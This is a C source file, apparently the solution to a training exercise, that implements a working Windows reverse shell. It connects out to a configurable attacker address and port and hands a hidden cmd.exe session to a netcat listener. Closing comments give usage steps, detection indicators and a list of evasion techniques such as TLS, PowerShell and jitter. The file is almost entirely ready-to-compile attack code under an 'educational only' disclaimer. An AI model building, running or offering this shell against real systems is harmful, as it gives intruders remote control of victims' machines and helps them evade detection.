/*
 * Solution: Exercise 03 - Simple Reverse Shell
 *
 * EDUCATIONAL PURPOSE ONLY - FOR AUTHORIZED TESTING ONLY
 *
 * This solution demonstrates:
 * - Reverse shell implementation
 * - Process creation with redirected I/O
 * - Handle inheritance
 * - Proper cleanup of all resources
 */

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define ATTACKER_IP "127.0.0.1"
#define ATTACKER_PORT 4444

int main(void) {
    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in serverAddr;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    int result;

    printf("[!] Reverse Shell Exercise - EDUCATIONAL ONLY\n");
    printf("[!] Only use on authorized systems\n\n");

    /* Initialize Winsock */
    result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        printf("[!] WSAStartup failed: %d\n", result);
        return 1;
    }
    printf("[+] Winsock initialized\n");

    /* Create socket */
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        printf("[!] socket() failed: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
    printf("[+] Socket created\n");

    /* Setup attacker address */
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(ATTACKER_PORT);
    inet_pton(AF_INET, ATTACKER_IP, &serverAddr.sin_addr);

    /* Connect to attacker */
    printf("[*] Connecting to %s:%d...\n", ATTACKER_IP, ATTACKER_PORT);
    result = connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
    if (result == SOCKET_ERROR) {
        printf("[!] connect() failed: %d\n", WSAGetLastError());
        printf("[!] Make sure listener is running: nc -lvp %d\n", ATTACKER_PORT);
        closesocket(sock);
        WSACleanup();
        return 1;
    }
    printf("[+] Connected to attacker!\n");

    /* Setup STARTUPINFO for I/O redirection */
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;  /* Hide the window */

    /* Redirect all I/O to socket */
    si.hStdInput = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError = (HANDLE)sock;

    /* Initialize PROCESS_INFORMATION */
    ZeroMemory(&pi, sizeof(pi));

    /* Create cmd.exe process */
    printf("[*] Spawning shell...\n");
    result = CreateProcessA(
        NULL,                   /* No application name */
        "cmd.exe",              /* Command line */
        NULL,                   /* Process security attributes */
        NULL,                   /* Thread security attributes */
        TRUE,                   /* Inherit handles - CRITICAL! */
        0,                      /* Creation flags */
        NULL,                   /* Use parent's environment */
        NULL,                   /* Use parent's current directory */
        &si,                    /* STARTUPINFO with redirected handles */
        &pi                     /* Receives PROCESS_INFORMATION */
    );

    if (!result) {
        printf("[!] CreateProcess failed: %d\n", GetLastError());
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    printf("[+] Shell spawned!\n");
    printf("[*] Process ID: %d\n", pi.dwProcessId);
    printf("[*] Thread ID: %d\n", pi.dwThreadId);
    printf("[*] Shell is now interactive on attacker's listener\n");

    /* Wait for cmd.exe to exit */
    printf("[*] Waiting for shell to exit...\n");
    WaitForSingleObject(pi.hProcess, INFINITE);

    printf("[*] Shell terminated\n");

    /* Cleanup process handles */
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    /* Cleanup socket */
    closesocket(sock);
    WSACleanup();

    printf("[+] Reverse shell exited cleanly\n");
    return 0;
}

/*
 * Critical Points:
 *
 * 1. bInheritHandles MUST be TRUE
 *    - Without this, cmd.exe cannot use redirected handles
 *    - Common mistake that breaks the shell
 *
 * 2. Handle Casting
 *    - SOCKET is compatible with HANDLE
 *    - Cast is necessary for STARTUPINFO
 *
 * 3. Process Cleanup
 *    - Close both process and thread handles
 *    - Prevents resource leaks
 *
 * 4. Waiting for Process
 *    - WaitForSingleObject prevents premature exit
 *    - Shell remains active until "exit" typed
 *
 * Usage Example:
 *
 * Terminal 1 (Attacker):
 *   nc -lvp 4444
 *
 * Terminal 2 (Target):
 *   ex03-solution.exe
 *
 * Terminal 1 (Attacker now has shell):
 *   C:\>dir
 *   C:\>whoami
 *   C:\>ipconfig
 *   C:\>exit
 *
 * Detection Indicators:
 * - Outbound connection from unexpected process
 * - cmd.exe with redirected handles
 * - Process parent-child anomaly
 * - Network traffic from cmd.exe
 *
 * Evasion Techniques (Advanced):
 * - Use PowerShell instead of cmd.exe
 * - Encrypt traffic with TLS
 * - Implement custom shell (no cmd.exe)
 * - Use named pipes instead of sockets
 * - Add jitter and sleep to avoid patterns
 *
 * These techniques covered in later modules!
 */
